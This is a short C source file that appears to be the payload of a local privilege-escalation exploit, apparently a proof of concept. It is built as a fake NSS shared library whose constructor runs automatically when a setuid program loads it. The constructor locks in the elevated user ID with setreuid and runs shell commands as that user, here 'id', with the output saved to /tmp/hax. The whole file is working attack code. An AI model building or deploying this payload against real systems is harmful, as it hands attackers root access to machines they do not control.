#include <stdio.h>

// gcc -shared -fPIC libnss_XXXX/liveoverflow.c -o libnss_XXXX/liveoverflow.so.2
void __attribute__ ((constructor)) setup(void) {
    printf("WE DID IT!\n");
    printf("WE DID IT!\n");
    printf("WE DID IT!\n");
    printf("WE DID IT!\n");
    setreuid(geteuid(),geteuid());
    system("id");
    system("id>/tmp/hax");
}